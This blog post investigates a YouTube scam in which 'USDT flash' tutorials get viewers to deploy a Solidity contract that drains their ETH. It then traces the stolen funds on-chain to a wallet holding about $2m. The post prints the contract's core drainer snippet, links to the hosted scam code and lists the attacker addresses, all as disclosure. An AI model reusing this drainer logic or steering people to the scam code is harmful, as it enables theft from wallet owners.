---
title: "$2m laundered: the YouTube crypto tutorials’ huge scam (investigation)"
url: "https://timsh.org/2m-laundered-the-youtube-crypto-tutorials-huge-scam-investigation/"
fetched_at: 2026-05-01T07:01:00.953371+00:00
source: "timsh.org"
tags: [blog, raw]
---

# $2m laundered: the YouTube crypto tutorials’ huge scam (investigation)

Source: https://timsh.org/2m-laundered-the-youtube-crypto-tutorials-huge-scam-investigation/

TL;DR
I accidentally stumbled upon a youtube video with a tutorial on “How to make / create a USDT flash token”, which contained very suspicious instructions.
I conducted an investigation to understand how this potential scam works, and found that:
There are hundreds of these videos across youtube that all advise people to deploy a 1000+ row contract with 0.025–0.1 ETH to make 10.000+ USDT.
In reality, these contracts just send out all victim’s money to addresses hardcoded in them.
These addresses then transfer the money to a single account that is currently holding $2m+ worth of crypto, which then launders it through stake.com and ByBit.
Digging further into this account has shown that it serves as an endpoint for other fraudulent funds and scams, detected by various analytics systems.
How it started
I was downloading some videos and articles I sent to myself in Telegram to check them during the flight, and ran into the link to this youtube video:
https://youtu.be/Jig3Hb-y3yo
.
Please be careful and don’t try following the steps of this “tutorial”
I don’t remember where I originally found it.
When I opened the link, I first thought: nice, here’s some solidity tutorial to watch on the plane.
But then I noticed that the video is only 3 minutes long — strange for a tutorial on such topic, yeah?
I decided to watch it immediately and soon realised that this is a scam scheme point of entry.
These short (2–4 minute) tutorials basically guide people through:
Opening Remix and connecting their wallet
Copying a bunch of code and pasting it into Remix (more than 1000 rows!)
Deploying the contract with some funds attached (from 0.025 to 0.1 ETH)
“Withdrawing” tens of thousands of USDT.
What made me 110% sure of the scammy nature of this thing were the comments:
squared scam
The underlined comment is an another type of scam that I wrote about in my Telegram channel a couple months ago — it’s a honeypot designed to make you think “what an idiot would share his seed phrase”… well, you know how it ends.
In the video description there was a legit link to Remix IDE and also a link to Google Sites with a pastebin code. I decided to take a look at the contract to see if I can spot the malicious functions or logic there.
Contract code
https://sites.google.com/view/flash-c0de
Be VERY careful. Don’t try deploying this code yourself!
The code is flooded with some nonsense logical operations and dummy functions with names like
UniswapLiquidityBot
, some legit Uniswap imports and addresses on the top, but the actual functionality can be reduced to this short snippet:
address UniswapV2 = 0x40d4AeC2145a1EeBE827Dab7EAea5BC337c386BB; 
 
function start() public payable { 
 payable((UniswapV2)).transfer(address(this).balance); 
} 
function withdrawal() public payable { 
 payable((UniswapV2)).transfer(address(this).balance); 
}
As you can see, this is a very (very) straightforward scam:
people are instructed to first deploy the contract, therefore creating a diversity of scam points of entry
they’re then required to first run
start()
and then the
withdrawal()
functions with all of the wallet’s money attached for gas + for the “exchange to the Flash USDT”.
all of the money from their wallets is transferred to scammer address in form of an internal operation — like the one above:
0x40d4AeC2145a1EeBE827Dab7EAea5BC337c386BB
Wallet history analysis
Next thing I decided to do was taking the address to etherscan to see the transaction history.
There were… a lot of them.
Since all of these transactions are internal, I switched to Tenderly to take a look at one of the deployed scam contracts:
notice the underlined: 0xbe9a6555 method selector and the 0x40d…386bb address mentioned before
Here we can see the initial
start()
method call: since the contract is unverified, the method selector (hash) is used instead of the actual function name.
Let’s double-check this by encoding “start()” with Keccak 256:
And this was the same with all of the contracts I checked manually: all of the
start()
and
withdrawal()
calls lead to the internal transfer to the wallet hardcoded in the scam sample code.
What was even more sad is to see that people called these methods repeatedly, round after round, some of them more than 10 times, hoping for the “Flash USDT” to magically appear on their draining wallets.
Where does the money go?
As we found out, all of the funds are transferred to the
0x40d4AeC2145a1EeBE827Dab7EAea5BC337c386BB
wallet.
It currently has a balance of 0.6 ETH — is that all the scammers managed to steal?
To find the answer, I created this
Metasleuth
project and tracked down the inputs and outputs of the wallet (pink one in the middle):
0x40…386BB inputs and outputs
There were
98 different contracts!
that transferred money to the wallet, a.k.a at least 98 scammed people.
Then the money was split between a couple of accounts, with most of it ending up on this wallet:
0x1922c641bf4a47202882cc832cc8726f4f5d7247
.
Already we can estimate the scam amount with this single entry wallet and chain to 3.5+ ETH: 0.6 still staying in the original wallet, with 2.91 already transferred to the one above.
All right, that’s it? 3.5 ETH worth of scam?
No.
Let’s see where the money goes from the
0x1922c641bf4a47202882cc832cc8726f4f5d7247
address:
We’ll focus on the next wallet in the chain —
0x4C77eFCB44eeED89AB54Cc0aeba64b2ddF919096
.
It currently holds…
$2.25 million across all chains,
including $670k worth of ETH!
is this good enough already to call ZackXBT?
Let’s stop here for a second.
We need to look at a different side of this scam first to be able to visualise the whole picture.
(lots of) Youtube tutorials
The scam entry point and promotion relies on dozens (if not hundreds) of YouTube videos with tutorials, posted on some crypto-related channels with +- 1000 followers.
All of the videos have a similar voiceover guiding the person through the scam and almost the same description, including the code hosted on Google Sites.
Try searching for the keywords on YouTube to see for yourself:
I’ve stopped counting after scrolling through 15 pages of these videos
I’ve noticed that some videos had different links to the code pastebin.
Reminder: the original one I stumped into was this:
https://sites.google.com/view/flash-c0de
The associated hardcoded value of
UniswapV2
:
0x40d4AeC2145a1EeBE827Dab7EAea5BC337c386BB
, that we looked into above.
Now let’s see if different links feature different addresses in the contract.
There are at least these 2 other links:
https://sites.google.com/view/flashusdtcode
https://sites.google.com/view/evmerc20code
Please be VERY careful. Don’t try deploying this code yourself!
Spoiler: yes, they both have other “Uniswap V2” addresses.
0x151dEcd657673a6204f22C30B8E7eE92097Ab016
and
0x9B3494fB37D028681a09438D9711bE47614410A2
.
Now let’s get back to our $2 million dollar wallet.
It’s all connected…
I created a separate MetaSleuth project, where I looked for potential links between these 2 new accounts and the previous chain.
[
Source
]
Guess what?
They all lead to our $2mln wallet — in the graph below you can see that 3 accounts mentioned in the scam contracts code all route the funds to the same wallet:
the 3 accounts on the left — pink is the original one and two“Another …” are the new ones
The $2m account seems like an endpoint for all of the fraudulent money made inside the scheme — it only outputs funds to a couple ByBit and A LOT of Stake.com wallets, then probably laundering the money through betting off-chain.
shout out to Drake somewhere around here
Ok, if stake.com and ByBit accept transfers from this account, that should mean that the reputation of the account is good, right? They should have KYT or even KYC along the way — how could they not spot this?
Well, if the scam is new and yet not discovered (the accounts mentioned above are not marked as risky by any analysis tool I used), then how could stake.com or their KYT provider know that the account has fraudulent source of funds… right?
Final steps and a space for further research
To find out if this $2m wallet is actually “innocent” or that rather stake.com and bybit accept dirty money, I started a few new projects on MetaSleuth.
The first one turned out so messy that I couldn’t connect the dots after identifying all routes. It’s too big to analyse manually.
But still, take a look — the red nodes on the left are critical risk addresses that MetaSleuth marks as Fake_Phishing, and the red node on the right is our $2m account:
are you winning, son?
[
Source
]
The next one is essentially the same, but I specifically filtered out 1 Fake_Phishing marked account to show the route of funds from it to our millionaire
0x4C77eFCB44eeED89AB54Cc0aeba64b2ddF919096
.
it’s crazy how little steps they took to “hide” the money
[
Source
]
As you can see, money from the Phishing account is sent as USDC → ETH → USDT that reaches our gold account.
I believe a lot more analysis can be done on this account, probably with more automated tools — I’m not an experienced onchain analyst, so I decided to stop here.
If you are one of them — please contact me so that we could investigate this further together:
[email protected]
Conclusion
It’s crazy how 1 youtube video I wanted to download turned out to be a 100+ videos that cost people at least 4 ETH, which then lead to an account with fraudulent income sources that processes millions of dollars.
Some questions I have:
If I can plot this using a free tool in 15 minutes, why do stake.com and bybit accept money from this account?
I reported some videos and accounts on youtube — do you think there might be a more effective way of stopping this “USDT Flash” scam?
Is there any person / organisation that I should send this research to, so that they could potentially “do something” about it? And if so — what is that “something”?
Anyway, thank you for reading this post up until the end.
I hope it was interesting and/or helpful — now you now about 1 more scam scheme out there.
